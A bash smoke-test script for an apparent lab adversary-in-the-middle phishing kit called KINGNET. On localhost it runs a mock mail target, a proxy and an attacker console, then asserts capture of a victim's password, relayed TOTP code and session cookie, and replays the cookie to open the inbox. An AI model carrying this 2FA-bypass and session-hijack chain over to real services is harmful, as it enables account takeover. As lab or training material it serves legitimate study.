#!/usr/bin/env bash
#
# KINGNET — Docker-free local smoke test (and handy dev runner).
#
# Launches the three lab services straight from the project venv (no Docker needed),
# then drives the FULL AiTM attack chain through the proxy and asserts each stage:
#   1. victim loads the proxied login  -> proxy mints a tracking id
#   2. victim submits password         -> proxy captures credentials
#   3. victim submits the live TOTP    -> proxy captures + relays the 2FA code
#   4. target issues the session cookie-> proxy steals it (and still logs the victim in)
#   5. attacker console replays it      -> victim's inbox opens (no pw, no 2FA)
#
# Everything binds to 127.0.0.1 only and is torn down on exit. Lab-only.
#
set -uo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
PY="$ROOT/.venv/bin/python"
[ -x "$PY" ] || PY="$(command -v python3)"

KINGMAIL_URL="http://localhost:8081"
PROXY_URL="http://localhost:8443"
CONSOLE_URL="http://localhost:9000"

TMP="$(mktemp -d)"
JAR="$TMP/cookies.txt"                  # the victim's browser cookie jar
export CONSOLE_DB="$TMP/captures.db"    # clean capture DB per run
SECRET="kingnet-lab-test-secret"
TOTP_SECRET="JBSWY3DPEHPK3PXP"          # the seeded lab victim's authenticator secret

cleanup() {
  for pf in "$TMP"/*.pid; do [ -f "$pf" ] && kill "$(cat "$pf")" 2>/dev/null || true; done
  rm -rf "$TMP"
}
trap cleanup EXIT

say()  { printf '\n\033[1;36m==> %s\033[0m\n' "$*"; }
pass() { printf '   \033[1;32m✓\033[0m %s\n' "$*"; }
fail() { printf '   \033[1;31m✗ %s\033[0m\n' "$*"; DUMP=1; }

# Launch a service fully detached (subshell + redirect) so it never holds this
# script's stdout; record its PID for precise teardown.
spawn() { # name dir port env...
  local name="$1" dir="$2" port="$3"; shift 3
  ( cd "$ROOT/$dir" && env "$@" "$PY" -m uvicorn app:app --host 127.0.0.1 --port "$port" \
      >"$TMP/$name.log" 2>&1 & echo $! >"$TMP/$name.pid" )
}

wait_up() {
  local url="$1" name="$2" i
  for i in $(seq 1 60); do
    curl -fsS "$url/healthz" >/dev/null 2>&1 && { pass "$name is up"; return 0; }
    sleep 0.25
  done
  printf '   \033[1;31m✗ %s did not come up (%s)\033[0m\n' "$name" "$url"; DUMP=1; return 1
}

DUMP=0
say "Launching lab services from $PY"
spawn kingmail targets/kingmail 8081 "KINGMAIL_SECRET=$SECRET"
spawn console  console          9000 "KINGMAIL_URL=$KINGMAIL_URL" "CONSOLE_DB=$CONSOLE_DB"
spawn proxy    proxy            8443 "TARGET_URL=$KINGMAIL_URL" "PROXY_PUBLIC_URL=$PROXY_URL" "CONSOLE_URL=$CONSOLE_URL"

wait_up "$KINGMAIL_URL" "KingMail target"
wait_up "$CONSOLE_URL"  "Attacker console"
wait_up "$PROXY_URL"    "AiTM proxy"

if [ "$DUMP" = 0 ]; then
  # -------------------------------------------------------------------------
  say "Step 1 — victim opens the phishing link (proxied login page)"
  if curl -fsS -c "$JAR" "$PROXY_URL/login" | grep -qi "KingMail"; then
    TRACK="$(awk '/kn_track/{print $7}' "$JAR" | tail -n1)"
    [ -n "$TRACK" ] && pass "proxied login served; victim tracked as track=$TRACK" \
                    || fail "proxy did not set a tracking cookie"
  else fail "proxied login page did not render the target"; fi

  say "Step 2 — victim submits credentials THROUGH the proxy"
  curl -fsS -b "$JAR" -c "$JAR" -o /dev/null \
    --data-urlencode "email=victim@kingmail.lab" \
    --data-urlencode "password=Summer2026!" "$PROXY_URL/login" \
    && pass "credentials posted (proxy forwarded to target, victim advanced to 2FA)" \
    || fail "credential POST failed"

  say "Step 3 — victim submits the live TOTP THROUGH the proxy"
  CODE="$("$PY" -c "import pyotp;print(pyotp.TOTP('$TOTP_SECRET').now())")"
  curl -fsS -b "$JAR" -c "$JAR" -o /dev/null --data-urlencode "code=$CODE" "$PROXY_URL/otp" \
    && pass "2FA code posted (code=$CODE)" || fail "OTP POST failed"
  grep -q "kingmail_session" "$JAR" \
    && pass "real session cookie issued to the victim (victim is really logged in)" \
    || fail "no session cookie was issued — the OTP relay failed"

  # -------------------------------------------------------------------------
  say "Step 4 — what did the attacker console capture?"
  DASH="$(curl -fsS "$CONSOLE_URL/")"
  echo "$DASH" | grep -q "Summer2026!"         && pass "captured the PASSWORD"       || fail "password not captured"
  echo "$DASH" | grep -q "victim@kingmail.lab" && pass "captured the USERNAME"       || fail "username not captured"
  echo "$DASH" | grep -q "$CODE"               && pass "captured the 2FA CODE"       || fail "2FA code not captured"
  echo "$DASH" | grep -qi "session"            && pass "captured the SESSION COOKIE" || fail "session cookie not captured"

  say "Step 5 — attacker replays the stolen cookie to hijack the mailbox"
  HIJACK="$(curl -fsS "$CONSOLE_URL/hijack/$TRACK")"
  echo "$HIJACK" | grep -q "victim@kingmail.lab" && pass "hijack opened the victim's inbox" || fail "hijack did not open the inbox"
  echo "$HIJACK" | grep -qi "Wire approval"      && pass "hijacked inbox content present"    || fail "hijacked inbox content missing"
fi

echo
if [ "$DUMP" = 0 ]; then
  printf '\033[1;32m==> ALL STAGES PASSED — KINGNET Phase 1 AiTM chain works end-to-end.\033[0m\n'
  echo "   (credentials captured, 2FA relayed, session stolen, account taken over — all lab-only.)"
  exit 0
else
  printf '\033[1;31m==> FAILURES ABOVE. Service logs:\033[0m\n'
  for l in kingmail proxy console; do echo "--- $l.log ---"; tail -n 20 "$TMP/$l.log" 2>/dev/null; done
  exit 1
fi
